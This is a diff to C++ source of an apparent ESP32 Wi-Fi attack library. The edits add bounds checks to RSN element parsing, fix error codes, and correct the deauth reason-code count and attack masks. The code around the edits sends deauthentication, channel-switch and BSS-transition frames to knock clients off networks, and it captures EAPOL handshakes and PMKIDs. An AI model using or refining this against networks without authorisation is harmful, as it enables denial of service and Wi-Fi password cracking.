@@ -144,20 +144,6 @@ Error Politician::begin(const Config &cfg) {
         if (esp_wifi_set_storage(WIFI_STORAGE_RAM) != ESP_OK) return ERR_WIFI_INIT;
 
         if (esp_wifi_set_mode(WIFI_MODE_APSTA) != ESP_OK) return ERR_WIFI_INIT;
-
-        wifi_config_t ap_cfg = {};
-        const char *ap_ssid = _cfg.soft_ap_ssid ? _cfg.soft_ap_ssid : "WiFighter";
-        size_t ap_ssid_len = strlen(ap_ssid);
-        if (ap_ssid_len > 32) ap_ssid_len = 32; // wifi_ap_config_t::ssid is uint8_t[32]
-        memcpy(ap_cfg.ap.ssid, ap_ssid, ap_ssid_len);
-        ap_cfg.ap.ssid_len        = (uint8_t)ap_ssid_len;
-        ap_cfg.ap.ssid_hidden     = _cfg.soft_ap_ssid ? 0 : 1;
-        ap_cfg.ap.max_connection  = 4;
-        ap_cfg.ap.authmode        = WIFI_AUTH_OPEN;
-        ap_cfg.ap.channel         = 1;
-        ap_cfg.ap.beacon_interval = 1000;
-        if (esp_wifi_set_config(WIFI_IF_AP, &ap_cfg) != ESP_OK) return ERR_WIFI_INIT;
-
         if (esp_wifi_start() != ESP_OK) return ERR_WIFI_INIT;
 
         esp_log_level_set("wifi", ESP_LOG_NONE);
@@ -171,6 +157,19 @@ Error Politician::begin(const Config &cfg) {
 
         _wifiInitialized = true;
     }
+
+    wifi_config_t ap_cfg = {};
+    const char *ap_ssid = _cfg.soft_ap_ssid ? _cfg.soft_ap_ssid : "WiFighter";
+    size_t ap_ssid_len = strlen(ap_ssid);
+    if (ap_ssid_len > 32) ap_ssid_len = 32; // wifi_ap_config_t::ssid is uint8_t[32]
+    memcpy(ap_cfg.ap.ssid, ap_ssid, ap_ssid_len);
+    ap_cfg.ap.ssid_len        = (uint8_t)ap_ssid_len;
+    ap_cfg.ap.ssid_hidden     = _cfg.soft_ap_ssid ? 0 : 1;
+    ap_cfg.ap.max_connection  = 4;
+    ap_cfg.ap.authmode        = WIFI_AUTH_OPEN;
+    ap_cfg.ap.channel         = 1;
+    ap_cfg.ap.beacon_interval = 1000;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
 
     esp_wifi_get_mac(WIFI_IF_STA, _ownStaMac);
     _log("[WiFi] STA MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
@@ -453,7 +452,7 @@ void Politician::clearTarget() {
 
 Error Politician::injectCustomFrame(const uint8_t *payload, size_t len, uint8_t channel, uint32_t lock_ms, bool wait_for_channel) {
     if (!_initialized) return ERR_NOT_ACTIVE;
-    if (len > 256) return ERR_WIFI_INIT; // Invalid length for queue
+    if (len > 256) return ERR_INVALID_ARG; // Invalid length for queue
     
     if (!_lock || xSemaphoreTakeRecursive(_lock, pdMS_TO_TICKS(200)) != pdTRUE) return ERR_WIFI_INIT;
     
@@ -487,7 +486,7 @@ Error Politician::injectCustomFrame(const uint8_t *payload, size_t len, uint8_t 
         }
         if (!queued) {
             xSemaphoreGiveRecursive(_lock);
-            return ERR_WIFI_INIT; // Queue full
+            return ERR_QUEUE_FULL; // Queue full
         }
     }
     
@@ -771,10 +770,9 @@ void Politician::tick() {
 
     _processFishing();
 
-    static uint32_t lastDiagMs = 0;
     uint32_t nowDiag = millis();
-    if (nowDiag - lastDiagMs >= 30000) {
-        lastDiagMs = nowDiag;
+    if (nowDiag - _lastDiagMs >= 30000) {
+        _lastDiagMs = nowDiag;
         _log("[Stats] total=%lu mgmt=%lu data=%lu eapol=%lu pmkid=%lu sae=%lu caps=%lu fail_pmkid=%lu fail_csa=%lu drop=%lu rb_max=%lu aps=%d lock=%s\n",
             (unsigned long)_stats.total, (unsigned long)_stats.mgmt,
             (unsigned long)_stats.data,  (unsigned long)_stats.eapol,
@@ -1346,7 +1344,8 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
                         memcpy(_fishSta, _apCache[ci].known_stas[0], 6); break;
                     }
                 }
-                if (!(_fishSta[0] || _fishSta[1] || _fishSta[2])) {
+                static const uint8_t zero_mac[6] = {};
+                if (memcmp(_fishSta, zero_mac, 6) == 0) {
                     for (int s = 0; s < MAX_SESSIONS; s++) {
                         if (_sessions[s].flags.active && _sessions[s].flags.has_m2 && memcmp(_sessions[s].bssid, ap.bssid, 6) == 0) {
                             memcpy(_fishSta, _sessions[s].sta, 6); break;
@@ -1364,7 +1363,8 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
                 _fishState = FISH_CSA_WAIT;
                 _csaSecondBurstSent = false;
                 if (effMask & ATTACK_CSA) _sendCsaBurst();
-                const uint8_t *known_sta = (_fishSta[0] || _fishSta[1] || _fishSta[2]) ? _fishSta : nullptr;
+                static const uint8_t zero_mac[6] = {};
+                const uint8_t *known_sta = (memcmp(_fishSta, zero_mac, 6) != 0) ? _fishSta : nullptr;
                 _csaFallbackMs = 0;
                 if (_disconnectStrategy == STRATEGY_SIMULTANEOUS) {
                     if (effMask & ATTACK_DEAUTH) _sendDeauthBurst((effMask & ATTACK_CSA) ? _cfg.csa_deauth_count : _cfg.deauth_burst_count, known_sta);
@@ -1387,7 +1387,6 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
                         for (int s = 0; s < _apCache[ci].known_sta_count; s++) {
                             for (int b = 0; b < _cfg.btm_burst_count; b++) {
                                 _sendBtmRequest(ap.bssid, _apCache[ci].known_stas[s]);
-                                delay(5);
                             }
                         }
                         _log("[BTM] Sent %d requests to %d clients on %02X:%02X:%02X:%02X:%02X:%02X\n",
@@ -1473,14 +1472,18 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
             if (tag == 48 && tlen >= 20) {
                 const uint8_t *rsn = ie + pos + 2;
                 uint16_t rlen = tlen;
-                uint16_t off = 2; off += 4;
-                uint16_t pw_cnt = ((uint16_t)rsn[off]) | ((uint16_t)rsn[off+1] << 8);
-                off += 2 + pw_cnt * 4;
-                uint16_t akm_cnt = ((uint16_t)rsn[off]) | ((uint16_t)rsn[off+1] << 8);
-                off += 2 + akm_cnt * 4;
+                uint16_t off = 6;
+                if (off + 2 > rlen) { pos += 2 + tlen; continue; }
+                uint16_t pw_cnt = ((uint16_t)rsn[off]) | ((uint16_t)rsn[off+1] << 8); off += 2;
+                if (pw_cnt > 20 || off + pw_cnt * 4 > rlen) { pos += 2 + tlen; continue; }
+                off += pw_cnt * 4;
+                if (off + 2 > rlen) { pos += 2 + tlen; continue; }
+                uint16_t akm_cnt = ((uint16_t)rsn[off]) | ((uint16_t)rsn[off+1] << 8); off += 2;
+                if (akm_cnt > 20 || off + akm_cnt * 4 > rlen) { pos += 2 + tlen; continue; }
+                off += akm_cnt * 4;
+                if (off + 4 > rlen) { pos += 2 + tlen; continue; }
                 off += 2;
-                uint16_t pmkid_cnt = ((uint16_t)rsn[off]) | ((uint16_t)rsn[off+1] << 8);
-                off += 2;
+                uint16_t pmkid_cnt = ((uint16_t)rsn[off]) | ((uint16_t)rsn[off+1] << 8); off += 2;
                 if (pmkid_cnt > 0 && off + 16 <= rlen) {
                     const uint8_t *pmkid_raw = rsn + off;
                     bool pmkid_valid = false;
@@ -1793,7 +1796,7 @@ bool Politician::_parseEapol(const uint8_t *bssid, const uint8_t *sta,
             if (_fishState == FISH_IDLE) {
                 if (!(_attackMask & (ATTACK_CSA | ATTACK_DEAUTH))) {
                     _log("[EAPOL] Half-handshake pivot skipped — CSA/Deauth required to complete capture\n");
-                } else if (_attackMask & (ATTACK_CSA | ATTACK_DEAUTH)) {
+                } else {
                     memcpy(_fishBssid, bssid, 6);
                     memcpy(_fishSsid, sess->ssid, sess->ssid_len); _fishSsid[sess->ssid_len] = '\0';
                     _fishSsidLen = sess->ssid_len; _fishChannel = sess->channel; _fishStartMs = millis();
@@ -2087,12 +2090,14 @@ uint8_t Politician::_classifyEnc(const uint8_t *ie, uint16_t ie_len) {
             has_rsn = true;
             // Parse robust security network AKM
             // Format: Version(2) + GroupCipher(4) + PairwiseCipherCount(2) + PairwiseCipherList(...) + AKMCount(2) + AKMList(...)
-            if (len >= 18) { // Minimum length to reach AKM count assuming 1 pairwise cipher
+            if (len >= 10) { // Minimum length to reach AKM count assuming 0 pairwise ciphers
                 uint16_t pw_count = (ie[pos+8] | (ie[pos+9] << 8));
+                if (pw_count > 20 || 10 + pw_count * 4 > len) { pos += 2 + len; continue; }
                 uint16_t akm_offset = pos + 10 + (pw_count * 4);
                 
                 if (akm_offset + 2 <= pos + 2 + len) {
                     uint16_t akm_count = (ie[akm_offset] | (ie[akm_offset + 1] << 8));
+                    if (akm_count > 20 || akm_offset + 2 + akm_count * 4 > pos + 2 + len) { pos += 2 + len; continue; }
                     uint16_t list_offset = akm_offset + 2;
                     
                     for (int i=0; i < akm_count; i++) {
@@ -2144,10 +2149,12 @@ bool Politician::_detectWpa3Only(const uint8_t *ie, uint16_t ie_len) {
 
         if (tag == 48 && len >= 10) { // RSN IE
             uint16_t pw_count   = ie[pos + 8] | (ie[pos + 9] << 8);
+            if (pw_count > 20 || 10 + pw_count * 4 > len) { pos += 2 + len; continue; }
             uint16_t akm_offset = pos + 10 + (pw_count * 4);
             if (akm_offset + 2 > pos + 2 + len) { pos += 2 + len; continue; }
 
             uint16_t akm_count = ie[akm_offset] | (ie[akm_offset + 1] << 8);
+            if (akm_count > 20 || akm_offset + 2 + akm_count * 4 > pos + 2 + len) { pos += 2 + len; continue; }
             uint16_t list_off  = akm_offset + 2;
 
             bool has_sae     = false;
@@ -2182,9 +2189,11 @@ bool Politician::_detectFt(const uint8_t *ie, uint16_t ie_len) {
         if (pos + 2 + len > ie_len) break;
         if (tag == 48 && len >= 10) { // RSN IE
             uint16_t pw_count  = ie[pos + 8] | (ie[pos + 9] << 8);
+            if (pw_count > 20 || 10 + pw_count * 4 > len) { pos += 2 + len; continue; }
             uint16_t akm_off   = pos + 10 + (pw_count * 4);
             if (akm_off + 2 <= pos + 2 + len) {
                 uint16_t akm_count = ie[akm_off] | (ie[akm_off + 1] << 8);
+                if (akm_count > 20 || akm_off + 2 + akm_count * 4 > pos + 2 + len) { pos += 2 + len; continue; }
                 uint16_t list_off  = akm_off + 2;
                 for (uint16_t i = 0; i < akm_count; i++) {
                     if (list_off + 4 > pos + 2 + len) break;
@@ -2208,9 +2217,11 @@ void Politician::_detectPmfFlags(const uint8_t *ie, uint16_t ie_len, bool &pmf_c
         if (pos + 2 + len > ie_len) break;
         if (tag == 48 && len >= 10) { // RSN IE
             uint16_t pw_count  = ie[pos + 8] | (ie[pos + 9] << 8);
+            if (pw_count > 20 || 10 + pw_count * 4 > len) { pos += 2 + len; continue; }
             uint16_t akm_off   = pos + 10 + (pw_count * 4);
             if (akm_off + 2 <= pos + 2 + len) {
                 uint16_t akm_count = ie[akm_off] | (ie[akm_off + 1] << 8);
+                if (akm_count > 20 || akm_off + 2 + akm_count * 4 > pos + 2 + len) { pos += 2 + len; continue; }
                 uint16_t caps_off  = akm_off + 2 + akm_count * 4;
                 if (caps_off + 2 <= pos + 2 + len) {
                     uint16_t caps = ie[caps_off] | (ie[caps_off + 1] << 8);
@@ -2601,7 +2612,7 @@ void Politician::_sendDeauthBurst(uint8_t count, const uint8_t *sta) {
     };
 
     static const uint8_t REASONS[] = { 7, 1, 2, 4, 8, 15 };
-    uint8_t num_reasons = sizeof(REASONS);
+    uint8_t num_reasons = sizeof(REASONS) / sizeof(REASONS[0]);
 
     for (int i = 0; i < count; i++) {
         deauth[0] = (i % 2 == 0) ? 0xC0 : 0xA0; // Alternate between Deauth (0xC0) and Disassoc (0xA0)
@@ -2714,11 +2725,13 @@ void Politician::_processFishing() {
             _log("[Attack] CSA fallback triggered — sending Deauth burst\n");
         }
 
+        uint8_t effMask = _getAttackMask(_fishBssid);
         if (!_csaSecondBurstSent && (millis() - _fishStartMs > 2000)) {
             _csaSecondBurstSent = true;
-            if (_attackMask & ATTACK_CSA) _sendCsaBurst();
+            if (effMask & ATTACK_CSA) _sendCsaBurst();
+            static const uint8_t zero_mac[6] = {};
             if (_disconnectStrategy == STRATEGY_SIMULTANEOUS) {
-                const uint8_t *known_sta2 = (_fishSta[0] || _fishSta[1] || _fishSta[2]) ? _fishSta : nullptr;
+                const uint8_t *known_sta2 = (memcmp(_fishSta, zero_mac, 6) != 0) ? _fishSta : nullptr;
                 if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst(_cfg.csa_deauth_count, known_sta2);
             }
             _log("[CSA] Burst 2\n");
